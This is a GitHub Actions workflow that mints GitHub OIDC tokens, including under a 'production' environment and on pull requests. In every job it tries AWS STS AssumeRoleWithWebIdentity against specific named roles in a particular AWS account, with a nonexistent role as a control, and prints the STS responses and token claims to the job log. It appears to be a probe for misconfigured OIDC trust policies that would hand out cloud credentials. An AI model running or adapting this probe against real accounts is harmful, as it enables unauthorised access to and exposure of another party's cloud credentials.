name: i125246-oidc-claims
on:
  workflow_dispatch:
  pull_request:
permissions:
  contents: read
  id-token: write
jobs:
  dispatch-token:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - name: mint-and-test
        run: |
          python3 - <<'PY'
          import json, os, urllib.request, urllib.error, urllib.parse, base64
          base=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']; tok=os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
          def mint(aud):
              url=base+('&' if '?' in base else '?')+'audience='+urllib.parse.quote(aud)
              req=urllib.request.Request(url,headers={'Authorization':'Bearer '+tok,'Accept':'application/json','User-Agent':'i125246'})
              return json.loads(urllib.request.urlopen(req,timeout=30).read())['value']
          def getclaims(jwt):
              p=jwt.split('.')[1]; p+='='*(-len(p)%4)
              return json.loads(base64.urlsafe_b64decode(p))
          def post(url,data):
              body=urllib.parse.urlencode(data).encode()
              req=urllib.request.Request(url,data=body,headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'i125246'})
              try:
                  r=urllib.request.urlopen(req,timeout=35); return r.status, r.read().decode('utf-8','replace')[:1200]
              except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')[:1200]
              except Exception as e: return -1, str(e)[:300]
          out={}
          try:
              j=mint('sts.amazonaws.com'); c=getclaims(j)
          except Exception as e:
              print('I125246_RESULT='+json.dumps({'context':'dispatch-or-pr','mint_failed':str(e)[:400],'env':{k:os.environ.get(k) for k in ('GITHUB_EVENT_NAME','GITHUB_REF','GITHUB_REPOSITORY')}}))
              raise SystemExit(0)
          out['ctx']='default'
          out['claims']={k:c.get(k) for k in ('sub','aud','iss','repository','repository_owner','ref','event_name','environment','job_workflow_ref')}
          out['token_len']=len(j)
          for arn in ['arn:aws:iam::159553542841:role/awslabs-AOSH-GitHubActionsRole',
                      'arn:aws:iam::159553542841:role/adai-template-publisher',
                      'arn:aws:iam::159553542841:role/i125246-nonexistent-control']:
              st,b=post('https://sts.amazonaws.com/',{'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'i125246','WebIdentityToken':j,'DurationSeconds':'3600'})
              out['sts::'+arn]={'http':st,'body':b[:600]}
          print('I125246_RESULT='+json.dumps(out))
          PY
  env-token:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      contents: read
      id-token: write
    steps:
      - name: mint-and-test-env
        run: |
          python3 - <<'PY'
          import json, os, urllib.request, urllib.error, urllib.parse, base64
          base=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']; tok=os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
          def mint(aud):
              url=base+('&' if '?' in base else '?')+'audience='+urllib.parse.quote(aud)
              req=urllib.request.Request(url,headers={'Authorization':'Bearer '+tok,'Accept':'application/json','User-Agent':'i125246'})
              return json.loads(urllib.request.urlopen(req,timeout=30).read())['value']
          def getclaims(jwt):
              p=jwt.split('.')[1]; p+='='*(-len(p)%4)
              return json.loads(base64.urlsafe_b64decode(p))
          def post(url,data):
              body=urllib.parse.urlencode(data).encode()
              req=urllib.request.Request(url,data=body,headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'i125246'})
              try:
                  r=urllib.request.urlopen(req,timeout=35); return r.status, r.read().decode('utf-8','replace')[:1200]
              except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')[:1200]
              except Exception as e: return -1, str(e)[:300]
          out={}
          try:
              j=mint('sts.amazonaws.com'); c=getclaims(j)
          except Exception as e:
              print('I125246_RESULT='+json.dumps({'ctx':'environment:production','mint_failed':str(e)[:400]}))
              raise SystemExit(0)
          out['ctx']='environment:production'
          out['claims']={k:c.get(k) for k in ('sub','aud','iss','repository','repository_owner','ref','event_name','environment','job_workflow_ref')}
          out['token_len']=len(j)
          for arn in ['arn:aws:iam::159553542841:role/awslabs-AOSH-GitHubActionsRole',
                      'arn:aws:iam::159553542841:role/adai-template-publisher',
                      'arn:aws:iam::159553542841:role/i125246-nonexistent-control']:
              st,b=post('https://sts.amazonaws.com/',{'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'i125246env','WebIdentityToken':j,'DurationSeconds':'3600'})
              out['sts::'+arn]={'http':st,'body':b[:600]}
          print('I125246_RESULT='+json.dumps(out))
          PY
